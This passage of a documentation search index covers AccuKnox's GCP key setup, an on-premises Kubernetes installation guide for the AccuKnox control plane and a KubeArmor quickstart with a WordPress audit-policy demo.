the required resources: <pre><code>terraform init\nterraform plan\nterraform apply\n</code></pre></p>"},{"location":"getting-started/gcp-cdr/#step-2-generate-service-account-keys","title":"Step 2: Generate Service account keys","text":"<ol> <li>Navigate to Service Accounts under IAM &amp; Admin &gt; Service Accounts</li> <li>Click on the Service Account Email (highlited in blue)</li> <li>Generate Keys under Keys &gt; Add Key</li> </ol> <p>Save the generated keys in a safe place and transmit them as well to your AccuKnox Point of Contact to start the onboarding process</p>"},{"location":"getting-started/kubearmor-release/","title":"KubeArmor Version Release Blogs","text":""},{"location":"getting-started/kubearmor-release/#kubearmor-version-release-blogs","title":"KubeArmor Version Release Blogs","text":"<ul> <li>v1.6 Release Blog \u2728</li> <li>v1.5 Release Blog \u2728</li> <li>v1.4 Release Blog \u2728</li> <li>v1.3 Release Blog \u2728</li> <li>v1.1 Release Blog \u2728</li> <li>v0.11 Release Blog \u2728</li> <li>v0.10 Release Blog \u2728</li> <li>v0.9 Release Blog \u2728</li> <li>v0.8 Release Blog \u2728</li> <li>v0.7 Release Blog \u2728</li> <li>v0.6 Release Blog \u2728</li> <li>v0.5 Release Blog \u2728</li> <li>v0.3 Release Blog \u2728</li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/on-prem-installation-guide/","title":"AccuKnox OnPrem Deployment Guide","text":""},{"location":"getting-started/on-prem-installation-guide/#high-level-architecture-overview","title":"High-Level Architecture Overview","text":"<p>AccuKnox onprem deployment is based on Kubernetes native architecture.</p>"},{"location":"getting-started/on-prem-installation-guide/#accuknox-onprem-k8s-components","title":"AccuKnox OnPrem k8s components","text":""},{"location":"getting-started/on-prem-installation-guide/#microservices","title":"Microservices","text":"<p>Microservices implement the API logic and provide the corresponding service endpoints. AccuKnox uses Golang-based microservices for handling streaming data (such as alerts and telemetry) and Python-based microservices for other control-plane services.</p>"},{"location":"getting-started/on-prem-installation-guide/#databases","title":"Databases","text":"<p>PostgreSQL is used as a relational database and MongoDB is used for storing JSON events such as alerts and telemetry. Ceph storage is used to keep periodic scanned reports and the Ceph storage is deployed and managed using the Rook storage operator.</p>"},{"location":"getting-started/on-prem-installation-guide/#secrets-management","title":"Secrets Management","text":"<p>Within the on-prem setup, there are several cases where sensitive data and credentials have to be stored. Hashicorp's Vault is used to store internal (such as DB username/password) and user secrets (such as registry tokens). The authorization is managed purely using the k8s native model of service accounts. Every microservice has its service account and uses its service account token automounted by k8s to authenticate and subsequently authorize access to the secrets.</p>"},{"location":"getting-started/on-prem-installation-guide/#scaling","title":"Scaling","text":"<p>K8s native horizontal and vertical pod autoscaling is enabled for most microservices with upper limits for resource requirements.</p>"},{"location":"getting-started/on-prem-installation-guide/#accuknox-agents","title":"AccuKnox-Agents","text":"<p>Agents need to be deployed in target k8s clusters and virtual machines that have to be secured at runtime and to get workload forensics. Agents use Linux native technologies such as eBPF for workload telemetry and LSMs (Linux Security Modules) for preventing attacks/unknown execution in the target workloads. The security policies are orchestrated from the AccuKnox onprem control plane. AccuKnox leverages SPIFFE/SPIRE for workload/node attestation and certificate provisioning. This ensures that the credentials are not hardcoded and automatically rotated. This also ensures that if the cluster/virtual machine has to be deboarded then the control lies with the AccuKnox control plane.</p>"},{"location":"getting-started/on-prem-installation-guide/#onboarding-steps-for-accuknox","title":"Onboarding Steps for AccuKnox","text":"<p>The onboarding process for AccuKnox's on-prem security solution consists of four key steps that the user must complete. Let's go through each step in a thorough, step-by-step manner:</p> <p></p>"},{"location":"getting-started/on-prem-installation-guide/#step-1-hardware-prerequisites","title":"Step 1: Hardware &amp; Prerequisites","text":"<ul> <li>Verify hardware, email user, and domain configurations.</li> <li>Ensure your environment meets all requirements.</li> <li>Time estimate: Varies, allocate sufficient time for review and adjustments.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#step-2-staging-accuknox-container-images-for-airgapped-environments-only","title":"Step 2: Staging AccuKnox Container Images (For airgapped environments only)","text":"<ul> <li>Stage AccuKnox container images in the airgapped setup.</li> <li>Reconfirm hardware, email user, and domain requirements.</li> <li>Time estimate: ~1 hour.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#step-3-installation","title":"Step 3: Installation","text":"<ul> <li>Install the AccuKnox system within your environment.</li> <li>Ensure all prerequisites remain satisfied.</li> <li>Time estimate: ~45 minutes.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#step-4-verificationvalidation","title":"Step 4: Verification/Validation","text":"<ul> <li>Confirm all previous steps were completed successfully.</li> <li>Validate hardware, email user, and domain configurations.</li> <li>Time estimate: ~1 hour.</li> </ul> <p>AccuKnox onprem deployment is based on Kubernetes native architecture.</p>"},{"location":"getting-started/on-prem-installation-guide/#pre-requisites-to-be-prepared-by-the-customer-team","title":"Pre-requisites to be prepared by the Customer Team","text":"Pre-requisites Why is it needed? Specs 3 Virtual machines or bare-metal nodes [Mandatory] To install the AccuKnox POC control plane in on-prem mode. Root access to the nodes would be required by the AccuKnox team during installation. - 1 node with at least 4 CPU + 16GB  - 2 nodes, each with 8 CPU + 16GB  - Each node has at least 256 GB of disk space.  - Each node is installed with Debian 13 OS  - These 3 nodes should have full ingress + egress connectivity between themselves.  - Users/APIs access to ports [443, 8443, 3000, 8081, 9090] should be enabled for all these VMs. Internet Connectivity [Mandatory] The VMs would require Internet connectivity during the installation. Egress only access to Port 80 + 443. Email User + Password + email ID + Server Address [Optional] AccuKnox Control plane allows one to invite other users to the Portal by sending an invitation via email AccuKnox Control plane configures 5 default users for whom the access will be enabled if this configuration is not provided. Trusted SSL Certificates [Optional] SSL Certificates are used for AccuKnox Portal. If trusted certs are not provided, we can use self-signed certs. Domain name entries [Mandatory] AccuKnox Portal and its REST APIs are accessible using these domain names. Domain names to configure:  - app.accuknox.domain.com  - cspm.accuknox.domain.com  - cwpp.accuknox.domain.com  - reports.accuknox.domain.com"},{"location":"getting-started/on-prem-installation-guide/#hardware-pre-requisites","title":"Hardware &amp; Pre-Requisites","text":""},{"location":"getting-started/on-prem-installation-guide/#vm-system-requirements","title":"VM System Requirements","text":"<p>All nodes are expected to make use of Debian 13 as their Operating System</p> Type Nodes Each node vCPUs Each Node RAM (GB) Each node Disk (GB) Master 1 4 8 256 Worker 2 8 16 256"},{"location":"getting-started/on-prem-installation-guide/#container-registry","title":"Container Registry","text":"<p>A Harbor container registry will be deployed on the master node if not available. Full Access to the registry is required to push and pull the AccuKnox microservice images from this registry.</p>"},{"location":"getting-started/on-prem-installation-guide/#harbor-installation-using-ansible","title":"Harbor Installation using Ansible","text":"<p>AccuKnox team will leverage an ansible playbook that:</p> <ul> <li>Installs Harbor</li> <li>Supports self-signed and letsencrypt-signed certificates.</li> </ul> <p>This playbook is tested with Harbor version 2.6.0 on Ubuntu 24.10 &amp; Debian 13.</p>"},{"location":"getting-started/on-prem-installation-guide/#external-roles","title":"External Roles","text":"<p>This playbook uses the following 3<sup>rd</sup> party collections/roles from ansible galaxy:</p> <ul> <li>geerlingguy.certbot: Installing and setting up certbot for managing letsencrypt-signed certificate.</li> <li>geerlingguy.docker: Installing docker and docker-compose.</li> <li>community.crypto: Generating self-signed certificate.</li> <li>robertdebock.roles: Collection of useful roles used to install Harbor.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#prerequisites","title":"Prerequisites","text":"<p>Make sure you have <code>ansible</code> and the <code>jmespath</code> python library installed.</p> <pre><code>python3 -m venv .venv\nsource .venv/bin/activate\npip3 install ansible jmespath netaddr\n</code></pre> <p>You can also install ansible using your distros package manager.</p>"},{"location":"getting-started/on-prem-installation-guide/#running-the-playbook","title":"Running the Playbook","text":"<p>Please edit the hosts.yaml file based on your environment before running this playbook. E.g.,</p> <pre><code>hosts:\n  harbor:\n    # this should point to a SSH host in your ssh config OR the VMs IP/Domain\n-   # ansible_host: \"\"\n-   # ansible_user: root\n-   # ansible_ssh_private_key_file: /path/to/ssh-priv-key.pem\n+   ansible_host: &lt;your-harbor-host-ip&gt;\n+   ansible_user: root\n+   ansible_ssh_private_key_file: /home/myuser/.ssh/harbor.pem\n\nvars:\n  ansible_python_interpreter: /usr/bin/python3\n  harbor_installation_type: online\n  # Specify the IP address or the fully qualified domain name (FQDN) of the target host on which to deploy Harbor.\n- # harbor_hostname: \"example.com\"\n+ harbor_hostname: \"harbor-test.example.com\"\n  harbor_admin_password: \"changeme\"\n  # Fill harbor_external_url if you want to enable external proxy.\n  # Use either harbor_hostname or harbor_external_url\n- # harbor_external_url: \"https://example.com\"\n+ harbor_external_url: \"https://harbor-test.example.com\"\n  harbor_enable_https: true\n\n  ## certificate configuration ##\n  ###############################\n  cert:\n-   # domain: \"example.com\"\n+   domain: \"harbor-test.example.com\"\n    # Both LetsEncrypt and self-signed cannot be enabled at the same time\n    self_signed:\n      enable: true\n</code></pre> <p>Next,</p> <pre><code>ansible-galaxy install -r requirements.yaml\nansible-playbook playbook.yaml\n</code></pre> <p>If your <code>ansible_user</code> is set to a non-root user on the system, ensure the user has permission to run commands with sudo. If running sudo commands requires a password, pass <code>--ask-become-pass</code> to the <code>ansible-playbook</code> command.</p> <pre><code>ansible-galaxy install -r requirements.yaml\nansible-playbook playbook.yaml --ask-become-pass\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#add-registry-ca-certificate-to-worker-nodes","title":"Add Registry CA Certificate to Worker Nodes","text":"<p>The harbor CA certificate should be located at /etc/nginx/certs/harbor.crt. You will have to copy it to every worker node under <code>/usr/local/share/ca-certificates/</code></p> <pre><code>cat /etc/nginx/certs/harbor.crt\n</code></pre> <p>Worker Node:</p> <pre><code>vi /usr/local/share/ca-certificates/harbor.crt\n</code></pre> <p>You\u2019ll also have run <code>update-ca-certificates</code> on the worker nodes and restart the container runtime (containerd / docker)</p> <pre><code>update-ca-certificates\n</code></pre> <p>Note: Restart the worker nodes.</p>"},{"location":"getting-started/on-prem-installation-guide/#kubernetes-cluster","title":"Kubernetes Cluster","text":"<p>Deploy K0s and initialize a cluster on the master node. Connect the worker nodes to the initialized cluster. Ensure the cluster is functional.</p>"},{"location":"getting-started/on-prem-installation-guide/#install-k0s","title":"Install k0s","text":"<pre><code>wget https://github.com/k0sproject/k0sctl/releases/download/v0.19.4/k0sctl-linux-amd64\nchmod +x k0sctl-linux-amd64\nsudo mv k0sctl-linux-amd64 /usr/local/bin/k0sctl\n</code></pre> <p>Bootstrap the cluster</p> <pre><code>k0sctl apply -c k0s.yaml\n</code></pre> <p>Once the cluster bootstrapping is complete, generate the kubeconfig file:</p> <pre><code>k0sctl kubeconfig -c k0s.yaml\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#persistent-volume-provisionercontroller","title":"Persistent Volume Provisioner/Controller","text":"<p>Used as data storage for SQL, MongoDB, scanned artifacts and other internal application components.</p>"},{"location":"getting-started/on-prem-installation-guide/#longhorn-installation","title":"Longhorn Installation","text":"<p>If not already available, Longhorn will be installed on the cluster.</p>"},{"location":"getting-started/on-prem-installation-guide/#prerequisites-preparing-nodes","title":"Prerequisites (Preparing Nodes)","text":"<p>Following commands need to be run on all the nodes:</p> <pre><code>#!/bin/bash\napt update -y\nmodprobe ceph\nmodprobe rbd\nmodprobe iscsi_tcp\napt install nfs-common -y\napt-get install open-iscsi -y\n</code></pre> <p>Please verify if the preflight check succeeds by following this linked guide before proceeding.</p>"},{"location":"getting-started/on-prem-installation-guide/#installation","title":"Installation","text":"<pre><code>helm install longhorn . --namespace longhorn-system --create-namespace --set global.imageRegistry=&lt;registry_address&gt;\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#ingress-controller","title":"Ingress Controller","text":"<p>For load balancing and providing access to the application.</p>"},{"location":"getting-started/on-prem-installation-guide/#attach-container-registry","title":"Attach Container Registry","text":"<p>If a container registry is available, we can connect to it, otherwise a Container Registry will be deployed as per the container registry prerequisites.</p> <p>The container registry credentials should be configured in the cluster to access the container images.</p>"},{"location":"getting-started/on-prem-installation-guide/#jump-host","title":"Jump Host","text":"<p>The jump host should have admin access to the deployed Kubernetes cluster to perform the installation.</p> <p>The jump host should have 80 GB of storage available. This will be required to temporarily store the container images before pushing them to the container registry.</p>"},{"location":"getting-started/on-prem-installation-guide/#tools-to-be-installed","title":"Tools to be Installed","text":"Tool Version Install Command <code>jq</code> 1.6 <code>apt install jq</code> <code>unzip</code> x.x <code>apt install unzip</code> <code>yq</code> v4.40.x See detailed install script below <code>helm</code> v3.x.x <code>curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 \\| bash</code> <code>kubectl</code> Supported by cluster Ensure compatible version is used <code>aws</code> v2 See detailed install script below <code>docker</code> v20.xx <code>apt install docker.io</code>"},{"location":"getting-started/on-prem-installation-guide/#yq-installation-v440x","title":"yq Installation (v4.40.x)","text":"<pre><code>VERSION=v4.40.5\nBINARY=yq_linux_amd64\nwget https://github.com/mikefarah/yq/releases/download/${VERSION}/${BINARY}.tar.gz -O - | tar xz\nmv ${BINARY} /usr/bin/yq\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#aws-cli-v2-installation","title":"AWS CLI v2 Installation","text":"<pre><code>curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\nunzip awscliv2.zip\nsudo ./aws/install --bin-dir /usr/local/bin --install-dir /usr/local/aws-cli --update\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#smtp-server","title":"SMTP Server","text":"<p>A working SMTP server is required for:</p> <ul> <li>User sign-in</li> <li>Password change</li> <li>Scan notifications</li> <li>Sending reports</li> </ul> <p>Required credentials:</p> <ul> <li>Email Username</li> <li>Password</li> <li>Sender Email ID</li> <li>Email Server Address</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#network-requirements","title":"Network Requirements","text":""},{"location":"getting-started/on-prem-installation-guide/#external-connections","title":"External Connections","text":"<p>Connectivity between AccuKnox components and other networks.</p> Component A Component/Endpoint B Ports Connection Type Purpose Worker Nodes VM/k8s clusters to be protected 443, 3000, 8081, 9090 Inbound to A For the runtime security agents to connect to the platform Worker Nodes Instance used for scanning/platform access 443 Inbound to A To access the platform and for scan results to be sent External Code Repository Worker Nodes 443 Bidirectional To connect and scan the code stored in an external code repository Master Node and Worker Nodes Internet * Outbound from A Temporary connection for initial setup"},{"location":"getting-started/on-prem-installation-guide/#dns-provisioning","title":"DNS Provisioning","text":"<p>A DNS record will need to be created for the AccuKnox endpoints after installation.</p> <ul> <li>A domain name must be provided for the AccuKnox installation.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#ssl-certificates","title":"SSL Certificates","text":"<p>Trusted SSL certificates need to be provided for the AccuKnox application.</p>"},{"location":"getting-started/on-prem-installation-guide/#staging-and-installation-steps","title":"Staging and Installation Steps","text":""},{"location":"getting-started/on-prem-installation-guide/#installation-package","title":"Installation Package","text":"<ul> <li> <p>Helm charts archive  <li> <p>Kubectl and Helm tools are pre-requisite tools for using these helm charts</p> </li> <pre><code>tar xvf accuknox-helm-charts.tgz\ncd Helm-charts\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#push-to-airgapped-registry","title":"Push to Airgapped registry","text":"<p>If you want to use your private/local registry as the exclusive source of images for the entire cluster, please install the accuknox-onprem-mgr component first.</p> Value Description Provider <code>registry.username</code> Registry User Customer <code>registry.password</code> Registry Password Customer <code>registry.address</code> The registry server address Customer <code>ecr.user</code> Credential to pull images from AccuKnox registry AccuKnox <code>ecr.password</code> Credential to pull images from AccuKnox registry AccuKnox <pre><code>cd airgapped-reg\n\n# configure aws cli with AccuKnox  provided secrets\naws configure\n\n# connect to docker Accuknox docker registry\naws ecr get-login-password --region us-east-2 | docker login --username AWS --password-stdin 956994857092.dkr.ecr.us-east-2.amazonaws.com\n\n# connect to airgapped registry\ndocker login &lt;registry_address&gt;\n\n# upload images to private registry\n./upload_images.sh &lt;registry_address&gt;\n./upload_onboarding_images.sh &lt;registry.address&gt;\n\n# upload helm charts to private registry\n./upload_helm.sh &lt;registry.address&gt;\n\n\n# create a namespace\nMGR_NS=\"accuknox-onprem-mgr\"\nCERT_MGR_NS=\"cert-manager\"\nkubectl create ns $MGR_NS\nkubectl create ns $CERT_MGR_NS\n\nkubectl create secret docker-registry airgapped-reg --docker-server=&lt;registry.address&gt; --docker-username=&lt;registry.username&gt; --docker-password=&lt;registry.password&gt; -n $MGR_NS\n\nkubectl create secret docker-registry airgapped-reg --docker-server=&lt;registry.address&gt; --docker-username=&lt;registry.username&gt; --docker-password=&lt;registry.password&gt; -n $CERT_MGR_NS\n\n# &lt;registry_address&gt; can include port as well\n./install-certmanager.sh &lt;registry_address&gt;\n\n./install-onprem-mgr.sh &lt;registry_address&gt;\n\nkubectl apply -k .\nkubectl apply -f onprem-mgr.yaml\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#update-overridevalues","title":"Update override.values","text":"<p>Only for air-gapped/private registry environment</p> <p>Set <code>global.onprem.airgapped</code> to <code>true</code> in the <code>override-values.yaml</code> file.</p>"},{"location":"getting-started/on-prem-installation-guide/#before-you-start","title":"Before You Start","text":"<ul> <li>Set your domain name in the override values file by replacing <code>&lt;your_domain.com&gt;</code> with your actual domain.</li> <li>Set your SSL preferences in the override values file by editing the <code>ssl</code> block.</li> <li>If the environment is air-gapped or using a private registry, make <code>ssl.certmanager.install: false</code></li> </ul> <pre><code>ssl:\n  certmanager:\n    install: false\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#ssl-certificate-deployment-models","title":"SSL Certificate Deployment Models","text":"<p>We offer three deployment models for SSL certificates:</p>"},{"location":"getting-started/on-prem-installation-guide/#1-auto-generated-self-signed-certificate","title":"1. Auto-generated Self-signed Certificate","text":"<p>We auto generate the needed self signed certificates for the client. To enable this option, set the following in your <code>override-values.yaml</code>:</p> <pre><code>ssl:\n  selfsigned: true\n  customcerts: false\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#2-certificate-signed-by-a-known-authority","title":"2. Certificate Signed by a Known Authority","text":"<p>Client provides certificate signed by a known authority:</p> <pre><code>ssl:\n  selfsigned: false\n  customcerts: true\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#3-self-signed-certificates-provided-by-the-customer","title":"3. Self-signed Certificates Provided by the Customer","text":"<p>Client provides their own self-signed certificate:</p> <pre><code>ssl:\n  selfsigned: true\n  customcerts: true\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#accuknox-installation-package","title":"AccuKnox Installation Package","text":"<p>The <code>override-values.yaml</code> file contains installation-specific configurations:</p> <ul> <li>Override <code>&lt;your_domain.com&gt;</code> with your actual domain.</li> <li>Set your SSL preferences in the override values by changing the <code>ssl</code> block.</li> </ul>"},{"location":"getting-started/on-prem-installation-guide/#install-accuknox-base-dependencies","title":"Install AccuKnox Base Dependencies","text":"<p>Run the following commands:</p> <pre><code>kubectl create namespace accuknox-chart\n\nhelm upgrade --install -n accuknox-chart accuknox-base accuknox-base-chart \\\n  --create-namespace -f override-values.yaml\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#important","title":"\u26a0\ufe0f IMPORTANT","text":"<p>Some resources deployed in the above step take time to provision. Running the next command too early may break the installation.</p> <p>Run the below script to make sure that the provisioning was done successfully:</p> <pre><code>while true\ndo\n    status=$(kubectl get cephcluster -n accuknox-ceph rook-ceph -o=jsonpath='{.status.phase}')\n    [[ $(echo $status | grep -v Ready | wc -l) -eq 0 ]] &amp;&amp; echo \"You can proceed\" &amp;&amp; break\n    echo \"wait for initialization\"\n    sleep 1\ndone\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#install-accuknox-pre-chart","title":"Install AccuKnox Pre Chart","text":"Value Description Provider <code>email.user</code> Email user used for signup invites, reports Customer <code>email.password</code> Email password Customer <code>email.host</code> Email server address Customer <code>email.from</code> Sender email address (e.g. noreply@domain.com) Customer <code>ecr.user</code> Registry credential username AccuKnox <code>ecr.password</code> Registry credential password AccuKnox <pre><code>helm upgrade --install -n accuknox-chart accuknox-pre pre-chart \\\n  --create-namespace -f override-values.yaml \\\n  --set global.email.from=\"\" \\\n  --set global.email.user=\"\" \\\n  --set global.email.password=\"\" \\\n  --set global.email.host=\"\" \\\n  --set ecr.user=\"\" \\\n  --set ecr.password=\"\"\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#install-accuknox-microservices-chart","title":"Install AccuKnox Microservices Chart","text":"Value Description Provider <code>email.user</code> Email user used for signup invites, reports Customer <code>email.password</code> Email password Customer <code>email.host</code> Email server address Customer <code>email.from</code> Sender email address Customer <pre><code>helm upgrade --install -n accuknox-chart accuknox-microservice accuknox-microservice-chart \\\n  --set global.email.user=\"\" \\\n  --set global.email.from=\"\" \\\n  --set global.email.password=\"\" \\\n  --set global.email.host=\"\" \\\n  --create-namespace -f override-values.yaml\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#map-dns","title":"Map DNS","text":"<p>Run the following script to generate DNS entries:</p> <p><pre><code>./generate_dns_entries\n</code></pre> Then create DNS records for the generated entries.</p>"},{"location":"getting-started/on-prem-installation-guide/#install-certificates","title":"Install Certificates","text":""},{"location":"getting-started/on-prem-installation-guide/#certificates-signed-by-a-known-authority","title":"Certificates Signed by a Known Authority","text":"<pre><code>./install_certs.sh &lt;certificate_path&gt; &lt;certificate_key_path&gt; &lt;ca_path&gt;\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#self-signed-certificates-provided-by-customer","title":"Self-Signed Certificates (Provided by Customer)","text":""},{"location":"getting-started/on-prem-installation-guide/#install-nginx-ingress","title":"Install NGINX Ingress","text":"<p>Navigate to the addons directory:</p> <pre><code>cd airgapped-reg/addons\n</code></pre> <p>Install the NGINX ingress controller:</p> <pre><code>helm upgrade --install ingress-nginx ingress-nginx \\\n  --namespace ingress-nginx --create-namespace \\\n  -f ingress-nginx.yaml \\\n  --set controller.image.registry=&lt;registry_address&gt; \\\n  --set controller.admissionWebhooks.image.registry=&lt;registry_address&gt;\n</code></pre> <p>Update domains in <code>ingress.yaml</code> and apply it:</p> <pre><code>kubectl apply -f ingress.yaml\n</code></pre>"},{"location":"getting-started/on-prem-installation-guide/#verify-installation","title":"Verify Installation","text":"<p>After successful installation, you should be able to access the following URLs:</p> <ul> <li>https://frontend.&lt;your-domain.com&gt;/ \u2014 Access the Sign-in page.</li> <li>https://cspm.&lt;your-domain.com&gt;/admin/ \u2014 Access the CSPM Admin page.</li> <li>https://cwpp.&lt;your-domain.com&gt;/cm/ \u2014 Access the CWPP Configuration Management page.</li> </ul> <p></p>"},{"location":"getting-started/on-prem-installation-guide/#references","title":"References","text":"<ol> <li>AccuKnox Deployment and Operations FAQs</li> <li>AccuKnox Splunk Integration Guide</li> <li>KubeArmor Splunk Integration Guide</li> <li>CSPM: Use-cases &amp; Scenarios</li> <li>CWPP: Use-cases &amp; Scenarios</li> <li>Detailed Support Matrix</li> </ol>"},{"location":"getting-started/open-source/","title":"Open Source","text":"<p>KubeArmor is an open-source sandbox project of AccuKnox which was donated to CNCF-Cloud Native Computing Foundation</p> <p>To contribute to the project access the Github page Learn more about KubeArmor here</p> <p></p> Deploying Sample Cluster (skip if you already have a cluster configured) Local K3s clusterGKE clusterAKS clusterEKS clusterKubeadm <p>Install K3s</p> <p>Note: Recommended base OS image is Ubuntu 20.04.</p> <pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--disable traefik' sh -s - --write-kubeconfig-mode 644\n</code></pre> <p>Make K3's cluster config the default</p> <pre><code>mkdir -p ~/.kube &amp;&amp; cp /etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code> - name: create a cluster\n   hosts: localhost\n   tasks:\n    - name: create a cluster\n      google.cloud.gcp_container_cluster:\n       name: gkecluster\n       initial_node_count: 1\n       node_config:\n         machine_type: e2-medium\n         disk_size_gb: 10\n         taints:\n          - effect: PREFER_NO_SCHEDULE\n            key: node.cilium.io/agent-not-ready\n            value: \"true\"\n       location: asia-east1\n       project: \"\"\n       auth_kind: serviceaccount\n       service_account_file: \"\"\n       state: present\n</code></pre> <pre><code>sudo apt-get install python3 -y\n</code></pre> <p><pre><code>sudo apt-get install ansible\n</code></pre> <pre><code>ansible-galaxy collection install google.cloud\n</code></pre></p> <pre><code>ansible-playbook kube-cluster.yaml\n</code></pre> <pre><code> - name: Create a managed Azure Container Services (AKS) instance\n   hosts: localhost\n   tasks:\n    - name:\n      azure_rm_aks:\n       name: myAKS\n       location: eastus\n       resource_group: myResourceGroup\n       dns_prefix: akstest\n       kubernetes_version: 1.24.3\n       linux_profile:\n        admin_username: azureuser\n        ssh_key: \"\"\n       service_principal:\n        client_id: \"\"\n        client_secret: \"\"\n       agent_pool_profiles:\n        - name: default\n          count: 2\n          vm_size: Standard_D2_v2\n</code></pre> <pre><code>sudo apt-get install python3 -y\n</code></pre> <pre><code>sudo apt-get install ansible\n</code></pre> <pre><code>ansible-galaxy collection install azure.azcollection\n</code></pre> <pre><code>ansible-playbook aks-cluster.yaml\n</code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\n\nmetadata:\n  name: kubearmor-ub20\n  region: us-east-2\n\nnodeGroups:\n  - name: ng-1\n    amiFamily: \"Ubuntu2004\"\n    privateNetworking: true\n    desiredCapacity: 2\n    # taint nodes so that application pods are\n    # not scheduled until Cilium is deployed.\n    taints:\n     - key: \"node.cilium.io/agent-not-ready\"\n       value: \"true\"\n       effect: \"NoSchedule\"\n    ssh:\n      allow: true\n    preBootstrapCommands:\n      - \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre> <pre><code>eksctl create cluster -f sample-ubuntu-18.04-cluster.yaml\n</code></pre> <pre><code>aws eks --region us-east-1 update-kubeconfig --name kubearmor-ub20\n</code></pre> <p>Install Pre-requisites</p> <ul> <li> <p>VirtualBox</p> </li> <li> <p>Vagrant</p> </li> <li> <p>kubectl</p> </li> <li> <p>Helm</p> </li> </ul> <p>Download the Vagrant setup</p> <ul> <li>Click here to download</li> </ul> <p>Untar and goto the Vagrant setup directory, Run the below command</p> <pre><code>vagrant up\n</code></pre> <p>Ref: KubeArmor support matrix</p>"},{"location":"getting-started/open-source/#1-install-kubearmor-cli-tool-daemonsets-and-services","title":"1. Install kubearmor cli tool, daemonsets and services","text":""},{"location":"getting-started/open-source/#install-kubearmor-cli-tool","title":"Install kubearmor cli tool","text":"<pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"getting-started/open-source/#install-daemonsets-and-services","title":"Install DaemonSets and Services","text":"<pre><code># Install KubeArmor\nkarmor install\n\n# Install Discovery-Engine\nkubectl apply -f https://raw.githubusercontent.com/kubearmor/discovery-engine/dev/deployments/k8s/deployment.yaml\n</code></pre> Output from kubectl get pods -A <pre><code>NAMESPACE         NAME                                                 READY   STATUS    RESTARTS   AGE\naccuknox-agents   discovery-engine-7b6ddbd7d7-swk7j                    1/1     Running   0          3m58s\nkube-system       kubearmor-78tnh                                      1/1     Running   0          4m7s\nkube-system       kubearmor-annotation-manager-797c848b9c-vxq8c        2/2     Running   0          4m\nkube-system       kubearmor-host-policy-manager-766447b4d7-fr5m4       2/2     Running   0          4m6s\nkube-system       kubearmor-policy-manager-54ffc4dc56-8szmn            2/2     Running   0          4m6s\nkube-system       kubearmor-relay-645667c695-bfwcn                     1/1     Running   0          4m7s\n...\n</code></pre> <p>We have following installed:</p> <ul> <li>KubeArmor Protection Engine</li> <li>Discovery Engine</li> <li>KubeArmor Relay</li> </ul>"},{"location":"getting-started/open-source/#2-install-sample-application","title":"2. Install Sample Application","text":"<p>Install the following app (WordPress) or you can try your own K8s app.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre> Output from kubectl get pods -n wordpress-mysql <pre><code>NAME                        READY   STATUS    RESTARTS   AGE\nmysql-58cdf6ccf-kzbp8       1/1     Running   0          12s\nwordpress-bf95888cb-2kx65   1/1     Running   0          13s\n</code></pre> <p>Keep a note of these pods name <code>mysql-xxxxxxxxx-xxxxx</code> &amp; <code>wordpress-xxxxxxxxx-xxxxx</code>, it'll be different for your environment</p> <p>The use-cases described in subsequent step uses this sample application.</p>"},{"location":"getting-started/open-source/#3-demo-scenario-use-cases","title":"3. Demo Scenario &amp; Use-cases","text":"Use-case 1: Audit access to sensitive data paths <p>NOTE 01: As of v1.1 KubeArmor has disabled file visbillity by default. This use case requires enabling file visibility by annotating the namespace using below command:</p> <pre><code>kubectl annotate ns wordpress-mysql kubearmor-visibility=\"process, file, network\" --overwrite\n</code></pre> <p>MySQL keeps all its database tables as part of <code>/var/lib/mysql</code> folder path. Audit access to this folder path recursively (sub-folders inclusive).</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-mysql-audit-dir\n  namespace: wordpress-mysql\nspec:\n  severity: 5\n  selector:\n    matchLabels:\n      app: mysql\n  file:\n    matchDirectories:\n      - dir: /var/lib/mysql/\n        recursive: true\n  action: Audit\n</code></pre> <p>Executing inside MySQL pod: Before applying policy <pre><code>kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test\n</code></pre></p> <p>NOTE 02: Replace <code>mysql-xxxxxxxxx-xxxxx</code> with pod name from Step #2</p> <p></p> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-mysql-audit-dir.yaml\n</code></pre></p> <p>Port Forwarding: We'll be using KubeArmor relay to forward logs to our local system <pre><code>kubectl -n kubearmor port-forward service/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre></p> <p>Realtime Logs Streaming: <pre><code>karmor logs\n</code></pre></p> 